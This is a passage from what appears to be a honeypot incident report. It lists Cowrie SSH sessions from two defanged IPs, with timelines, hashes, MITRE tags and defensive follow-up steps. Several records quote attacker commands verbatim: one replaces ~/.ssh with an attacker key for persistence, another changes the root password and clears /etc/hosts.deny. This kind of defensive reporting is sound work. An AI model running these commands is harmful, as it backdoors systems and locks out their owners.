| `2026-06-01 18:55:32` | `cowrie.client.version` |
| `2026-06-01 18:55:32` | `cowrie.client.kex` |
| `2026-06-01 18:55:33` | `cowrie.login.success` |
| `2026-06-01 18:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-867efe375a0b

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:55 |
| **Last Seen** | 2026-06-01 18:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:55:43` | `cowrie.session.connect` |
| `2026-06-01 18:55:43` | `cowrie.client.version` |
| `2026-06-01 18:55:44` | `cowrie.client.kex` |
| `2026-06-01 18:55:44` | `cowrie.login.success` |
| `2026-06-01 18:55:45` | `cowrie.session.params` |
| `2026-06-01 18:55:45` | `cowrie.command.input` |
| `2026-06-01 18:55:45` | `cowrie.command.failed` |
| `2026-06-01 18:55:45` | `cowrie.log.closed` |
| `2026-06-01 18:55:45` | `cowrie.session.params` |
| `2026-06-01 18:55:45` | `cowrie.command.input` |
| `2026-06-01 18:55:46` | `cowrie.session.file_download` |
| `2026-06-01 18:55:46` | `cowrie.log.closed` |
| `2026-06-01 18:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-914bd307c066

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:55 |
| **Last Seen** | 2026-06-01 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:55:48` | `cowrie.session.connect` |
| `2026-06-01 18:55:48` | `cowrie.client.version` |
| `2026-06-01 18:55:48` | `cowrie.client.kex` |
| `2026-06-01 18:55:49` | `cowrie.login.success` |
| `2026-06-01 18:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878057200b9b

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:56 |
| **Last Seen** | 2026-06-01 18:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:56:00` | `cowrie.session.connect` |
| `2026-06-01 18:56:00` | `cowrie.client.version` |
| `2026-06-01 18:56:01` | `cowrie.client.kex` |
| `2026-06-01 18:56:01` | `cowrie.login.success` |
| `2026-06-01 18:56:02` | `cowrie.session.params` |
| `2026-06-01 18:56:02` | `cowrie.command.input` |
| `2026-06-01 18:56:02` | `cowrie.command.failed` |
| `2026-06-01 18:56:02` | `cowrie.log.closed` |
| `2026-06-01 18:56:02` | `cowrie.session.params` |
| `2026-06-01 18:56:02` | `cowrie.command.input` |
| `2026-06-01 18:56:03` | `cowrie.session.file_download` |
| `2026-06-01 18:56:03` | `cowrie.log.closed` |
| `2026-06-01 18:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0987e25583

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:56 |
| **Last Seen** | 2026-06-01 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:56:05` | `cowrie.session.connect` |
| `2026-06-01 18:56:05` | `cowrie.client.version` |
| `2026-06-01 18:56:05` | `cowrie.client.kex` |
| `2026-06-01 18:56:06` | `cowrie.login.success` |
| `2026-06-01 18:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a42bd2cc5fed

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:56 |
| **Last Seen** | 2026-06-01 18:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:56:34` | `cowrie.session.connect` |
| `2026-06-01 18:56:34` | `cowrie.client.version` |
| `2026-06-01 18:56:34` | `cowrie.client.kex` |
| `2026-06-01 18:56:34` | `cowrie.login.success` |
| `2026-06-01 18:56:35` | `cowrie.session.params` |
| `2026-06-01 18:56:35` | `cowrie.command.input` |
| `2026-06-01 18:56:35` | `cowrie.command.failed` |
| `2026-06-01 18:56:35` | `cowrie.log.closed` |
| `2026-06-01 18:56:36` | `cowrie.session.params` |
| `2026-06-01 18:56:36` | `cowrie.command.input` |
| `2026-06-01 18:56:36` | `cowrie.session.file_download` |
| `2026-06-01 18:56:36` | `cowrie.log.closed` |
| `2026-06-01 18:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f32673fa78

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:56 |
| **Last Seen** | 2026-06-01 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:56:38` | `cowrie.session.connect` |
| `2026-06-01 18:56:38` | `cowrie.client.version` |
| `2026-06-01 18:56:38` | `cowrie.client.kex` |
| `2026-06-01 18:56:39` | `cowrie.login.success` |
| `2026-06-01 18:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7a8b7eecdc

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:57 |
| **Last Seen** | 2026-06-01 18:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:57:41` | `cowrie.session.connect` |
| `2026-06-01 18:57:41` | `cowrie.client.version` |
| `2026-06-01 18:57:41` | `cowrie.client.kex` |
| `2026-06-01 18:57:42` | `cowrie.login.success` |
| `2026-06-01 18:57:42` | `cowrie.session.params` |
| `2026-06-01 18:57:42` | `cowrie.command.input` |
| `2026-06-01 18:57:42` | `cowrie.command.failed` |
| `2026-06-01 18:57:43` | `cowrie.log.closed` |
| `2026-06-01 18:57:43` | `cowrie.session.params` |
| `2026-06-01 18:57:43` | `cowrie.command.input` |
| `2026-06-01 18:57:43` | `cowrie.session.file_download` |
| `2026-06-01 18:57:43` | `cowrie.log.closed` |
| `2026-06-01 18:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b553af10caa

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 18:57 |
| **Last Seen** | 2026-06-01 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 18:57:46` | `cowrie.session.connect` |
| `2026-06-01 18:57:46` | `cowrie.client.version` |
| `2026-06-01 18:57:46` | `cowrie.client.kex` |
| `2026-06-01 18:57:47` | `cowrie.login.success` |
| `2026-06-01 18:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9731910a97b5

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 19:00 |
| **Last Seen** | 2026-06-01 19:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 19:00:06` | `cowrie.session.connect` |
| `2026-06-01 19:00:06` | `cowrie.client.version` |
| `2026-06-01 19:00:06` | `cowrie.client.kex` |
| `2026-06-01 19:00:07` | `cowrie.login.success` |
| `2026-06-01 19:00:07` | `cowrie.session.params` |
| `2026-06-01 19:00:07` | `cowrie.command.input` |
| `2026-06-01 19:00:07` | `cowrie.command.failed` |
| `2026-06-01 19:00:08` | `cowrie.log.closed` |
| `2026-06-01 19:00:08` | `cowrie.session.params` |
| `2026-06-01 19:00:08` | `cowrie.command.input` |
| `2026-06-01 19:00:08` | `cowrie.session.file_download` |
| `2026-06-01 19:00:08` | `cowrie.log.closed` |
| `2026-06-01 19:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9d74e942baa

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]225` |
| **First Seen** | 2026-06-01 19:00 |
| **Last Seen** | 2026-06-01 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 19:00:11` | `cowrie.session.connect` |
| `2026-06-01 19:00:11` | `cowrie.client.version` |
| `2026-06-01 19:00:11` | `cowrie.client.kex` |
| `2026-06-01 19:00:12` | `cowrie.login.success` |
| `2026-06-01 19:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e802345373be

| Field | Detail |
|---|---|
| **Source IP** | `120.48.130[.]213` |
| **First Seen** | 2026-06-01 19:02 |
| **Last Seen** | 2026-06-01 19:03 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:osIhiCeCHqYb"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 19:02:45` | `cowrie.session.connect` |
| `2026-06-01 19:02:45` | `cowrie.client.version` |
| `2026-06-01 19:02:47` | `cowrie.client.kex` |
| `2026-06-01 19:02:51` | `cowrie.login.success` |
| `2026-06-01 19:02:51` | `cowrie.session.params` |
| `2026-06-01 19:02:51` | `cowrie.command.input` |
| `2026-06-01 19:02:51` | `cowrie.command.failed` |
| `2026-06-01 19:02:52` | `cowrie.log.closed` |
| `2026-06-01 19:02:52` | `cowrie.session.params` |
| `2026-06-01 19:02:52` | `cowrie.command.input` |
| `2026-06-01 19:02:52` | `cowrie.session.file_download` |
| `2026-06-01 19:02:52` | `cowrie.log.closed` |
| `2026-06-01 19:03:05` | `cowrie.session.params` |
| `2026-06-01 19:03:05` | `cowrie.command.input` |
| `2026-06-01 19:03:05` | `cowrie.log.closed` |
| `2026-06-01 19:03:06` | `cowrie.session.params` |
| `2026-06-01 19:03:06` | `cowrie.command.input` |
| `2026-06-01 19:03:06` | `cowrie.log.closed` |
| `2026-06-01 19:03:07` | `cowrie.session.params` |
| `2026-06-01 19:03:07` | `cowrie.command.input` |
| `2026-06-01 19:03:07` | `cowrie.session.file_download` |
| `2026-06-01 19:03:07` | `cowrie.log.closed` |
| `2026-06-01 19:03:08` | `cowrie.session.params` |
| `2026-06-01 19:03:08` | `cowrie.command.input` |
| `2026-06-01 19:03:08` | `cowrie.log.closed` |
| `2026-06-01 19:03:09` | `cowrie.session.params` |
| `2026-06-01 19:03:09` | `cowrie.command.input` |
| `2026-06-01 19:03:10` | `cowrie.log.closed` |
| `2026-06-01 19:03:12` | `cowrie.session.params` |
| `2026-06-01 19:03:12` | `cowrie.command.input` |
| `2026-06-01 19:03:12` | `cowrie.command.input` |
| `2026-06-01 19:03:14` | `cowrie.log.closed` |
| `2026-06-01 19:03:14` | `cowrie.session.params` |
| `2026-06-01 19:03:14` | `cowrie.command.input` |
| `2026-06-01 19:03:15` | `cowrie.log.closed` |
| `2026-06-01 19:03:19` | `cowrie.session.params` |
| `2026-06-01 19:03:19` | `cowrie.command.input` |
| `2026-06-01 19:03:19` | `cowrie.log.closed` |
| `2026-06-01 19:03:20` | `cowrie.session.params` |
| `2026-06-01 19:03:20` | `cowrie.command.input` |
| `2026-06-01 19:03:21` | `cowrie.log.closed` |
| `2026-06-01 19:03:21` | `cowrie.session.params` |
| `2026-06-01 19:03:21` | `cowrie.command.input` |
| `2026-06-01 19:03:22` | `cowrie.log.closed` |
| `2026-06-01 19:03:22` | `cowrie.session.params` |
| `2026-06-01 19:03:22` | `cowrie.command.input` |
| `2026-06-01 19:03:22` | `cowrie.log.closed` |
| `2026-06-01 19:03:23` | `cowrie.session.params` |
| `2026-06-01 19:03:23` | `cowrie.command.input` |
| `2026-06-01 19:03:23` | `cowrie.log.closed` |
| `2026-06-01 19:03:26` | `cowrie.session.params` |
| `2026-06-01 19:03:26` | `cowrie.command.input` |
| `2026-06-01 19:03:26` | `cowrie.log.closed` |
| `2026-06-01 19:03:30` | `cowrie.session.params` |
| `2026-06-01 19:03:30` | `cowrie.command.input` |
| `2026-06-01 19:03:30` | `cowrie.log.closed` |
| `2026-06-01 19:03:33` | `cowrie.session.params` |
| `2026-06-01 19:03:33` | `cowrie.command.input` |
| `2026-06-01 19:03:33` | `cowrie.log.closed` |
| `2026-06-01 19:03:34` | `cowrie.session.params` |
| `2026-06-01 19:03:34` | `cowrie.command.input` |
| `2026-06-01 19:03:34` | `cowrie.log.closed` |
| `2026-06-01 19:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.130[.]213` to AbuseIPDB if not already reported
- [ ] Block `120.48.130[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dff914aee8e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.130[.]213` |
| **First Seen** | 2026-06-01 19:05 |
| **Last Seen** | 2026-06-01 19:06 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gVdO9ZF5IRvy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 19:05:21` | `cowrie.session.connect` |
| `2026-06-01 19:05:22` | `cowrie.client.version` |
| `2026-06-01 19:05:22` | `cowrie.client.kex` |
| `2026-06-01 19:05:24` | `cowrie.login.success` |
| `2026-06-01 19:05:26` | `cowrie.session.params` |
| `2026-06-01 19:05:26` | `cowrie.command.input` |
| `2026-06-01 19:05:26` | `cowrie.command.failed` |
| `2026-06-01 19:05:26` | `cowrie.log.closed` |
| `2026-06-01 19:05:27` | `cowrie.session.params` |
| `2026-06-01 19:05:27` | `cowrie.command.input` |
| `2026-06-01 19:05:27` | `cowrie.session.file_download` |
| `2026-06-01 19:05:27` | `cowrie.log.closed` |
| `2026-06-01 19:05:39` | `cowrie.session.params` |
| `2026-06-01 19:05:39` | `cowrie.command.input` |
| `2026-06-01 19:05:39` | `cowrie.log.closed` |
| `2026-06-01 19:05:40` | `cowrie.session.params` |
| `2026-06-01 19:05:40` | `cowrie.command.input` |
| `2026-06-01 19:05:40` | `cowrie.log.closed` |
| `2026-06-01 19:05:43` | `cowrie.session.params` |
| `2026-06-01 19:05:43` | `cowrie.command.input` |
| `2026-06-01 19:05:43` | `cowrie.session.file_download` |
| `2026-06-01 19:05:43` | `cowrie.log.closed` |
| `2026-06-01 19:05:43` | `cowrie.session.params` |
| `2026-06-01 19:05:43` | `cowrie.command.input` |
| `2026-06-01 19:05:44` | `cowrie.log.closed` |
| `2026-06-01 19:05:45` | `cowrie.session.params` |
| `2026-06-01 19:05:45` | `cowrie.command.input` |
| `2026-06-01 19:05:45` | `cowrie.log.closed` |
| `2026-06-01 19:05:46` | `cowrie.session.params` |
| `2026-06-01 19:05:46` | `cowrie.command.input` |
| `2026-06-01 19:05:46` | `cowrie.command.input` |
| `2026-06-01 19:05:46` | `cowrie.log.closed` |
| `2026-06-01 19:05:47` | `cowrie.session.params` |
| `2026-06-01 19:05:47` | `cowrie.command.input` |
| `2026-06-01 19:05:47` | `cowrie.log.closed` |
| `2026-06-01 19:05:48` | `cowrie.session.params` |
| `2026-06-01 19:05:48` | `cowrie.command.input` |
| `2026-06-01 19:05:49` | `cowrie.log.closed` |
| `2026-06-01 19:05:50` | `cowrie.session.params` |
| `2026-06-01 19:05:50` | `cowrie.command.input` |
| `2026-06-01 19:05:50` | `cowrie.log.closed` |
| `2026-06-01 19:05:51` | `cowrie.session.params` |
| `2026-06-01 19:05:51` | `cowrie.command.input` |
| `2026-06-01 19:05:57` | `cowrie.log.closed` |
| `2026-06-01 19:05:58` | `cowrie.session.params` |
| `2026-06-01 19:05:58` | `cowrie.command.input` |
| `2026-06-01 19:05:58` | `cowrie.log.closed` |
| `2026-06-01 19:05:59` | `cowrie.session.params` |
| `2026-06-01 19:05:59` | `cowrie.command.input` |
| `2026-06-01 19:06:00` | `cowrie.log.closed` |
| `2026-06-01 19:06:01` | `cowrie.session.params` |
| `2026-06-01 19:06:01` | `cowrie.command.input` |
| `2026-06-01 19:06:03` | `cowrie.log.closed` |
| `2026-06-01 19:06:04` | `cowrie.session.params` |
| `2026-06-01 19:06:04` | `cowrie.command.input` |
| `2026-06-01 19:06:04` | `cowrie.log.closed` |
| `2026-06-01 19:06:05` | `cowrie.session.params` |
| `2026-06-01 19:06:05` | `cowrie.command.input` |
| `2026-06-01 19:06:05` | `cowrie.log.closed` |
| `2026-06-01 19:06:05` | `cowrie.session.params` |
| `2026-06-01 19:06:05` | `cowrie.command.input` |
| `2026-06-01 19:06:06` | `cowrie.log.closed` |
| `2026-06-01 19:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.130[.]213` to AbuseIPDB if not already reported
- [ ] Block `120.48.130[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
